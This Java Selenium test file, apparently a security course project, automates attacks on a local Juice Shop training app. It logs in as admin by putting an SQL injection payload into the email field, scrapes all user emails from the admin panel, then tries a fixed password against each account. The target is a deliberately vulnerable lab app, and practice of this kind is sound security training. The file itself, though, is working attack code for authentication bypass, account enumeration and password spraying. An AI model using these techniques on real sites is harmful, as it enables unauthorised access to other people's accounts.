package interviewPrep;

import org.jetbrains.annotations.NotNull;
import org.openqa.selenium.*;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import utils.Base;

import javax.swing.*;
import java.util.*;

public class SecTestProject extends Base {

    WebDriver driver;
    WebDriverWait webDriverWait;
    List<String> userNames;

    @BeforeClass
    public void initDriver() {
        driver = initializeDriver();
        implicitWaitFor(15);
        userNames = new ArrayList<>();
    }

    @Test(description = "Project Part 3", enabled = true, priority = 1)
    public void loginAsAdmin() throws InterruptedException {
        driver.get("http://192.168.1.120:3000/#/");
        Thread.sleep(3000);
        WebElement bannerButton = driver.findElement(By.cssSelector(".mat-focus-indicator.close-dialog.mat-raised-button.mat-button-base.mat-primary.ng-star-inserted"));

        if (bannerButton.isDisplayed())
            bannerButton.click();

        driver.findElement(By.id("navbarAccount")).click(); //Click on the account button
        driver.findElement(By.id("navbarLoginButton")).click(); //Click on the login button

        driver.findElement(By.id("email")).sendKeys("admin@juice-sh.op' -- 1"); //use sql injection to login
        driver.findElement(By.id("password")).sendKeys("12345");

        driver.findElement(By.id("loginButton")).click();

        Thread.sleep(3000);

    }

    @Test(description = "Get all the user names", priority = 2)
    public void getAllUsers() throws InterruptedException {

        driver.get("http://192.168.1.120:3000/#/administration"); // access the admin section
        Thread.sleep(4000);

        List<WebElement> tables = driver.findElements(By.cssSelector("mat-table.mat-table.cdk-table"));
        //System.out.println("Two " + tables.size());
        WebElement table = tables.get(0);
        WebElement userTable = driver.findElement(By.xpath("//div[@class='user-table']/mat-table"));

        for (int z = 0; z < 2; z++) { //Loop through two pages of user list
            List<WebElement> allEmail = table.findElements(By.cssSelector(".mat-row.cdk-row.ng-star-inserted")); //Find all the rows from the user table
            List<WebElement> users = userTable.findElements(By.xpath("//mat-row/mat-cell/span[@class='error']")); //Find the users tag
            for (int i = 0; i < allEmail.size(); i++) {
                //System.out.println(i);
                String userName = users.get(i).getText(); //Get the user names
                if (userName.contains("@")) //Add to user name list only if its a valid user name.
                    userNames.add(userName);
            }
            driver.findElement(By.cssSelector(".mat-focus-indicator.mat-tooltip-trigger.mat-paginator-navigation-next.mat-icon-button.mat-button-base")).click();
            Thread.sleep(3000);
        }

        for (String temp : userNames)
            System.out.println(temp);
    }

    @Test(description = "Move to login screen", priority = 3)
    public void moveToLoginScreen() throws InterruptedException{
        driver.findElement(By.id("navbarAccount")).click(); //Click on the account button
        driver.findElement(By.id("navbarLogoutButton")).click(); //Click on the logout button
        Thread.sleep(2000);
        driver.findElement(By.id("navbarAccount")).click(); //Click on the account button
        driver.findElement(By.id("navbarLoginButton")).click(); //Click on the login button
        Thread.sleep(2000);
    }

    @Test(description = "Login with all the usernames", priority = 4)
    public void LoginWithAllUsers() throws InterruptedException {


        String password ="0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB";

        for(String user : userNames) {

            driver.findElement(By.id("email")).sendKeys(user); //use sql injection to login
            driver.findElement(By.id("password")).sendKeys(password);

            driver.findElement(By.id("loginButton")).click();
            WebElement errorElement = driver.findElement(By.cssSelector(".error.ng-star-inserted"));

            if(!(errorElement.isDisplayed() && errorElement.getText().contains("Invalid email or password."))) { //Check whether the entered password is correct or not.
                System.out.println("The user name is : " + user);
                System.out.println("Hashed password is : "+password);
                System.out.println( "Successfully logged in");
                break;
            }
            Thread.sleep(1000);
            driver.findElement(By.id("email")).clear(); //use sql injection to login
            driver.findElement(By.id("password")).clear();
            Thread.sleep(1000);

        }
    }

}
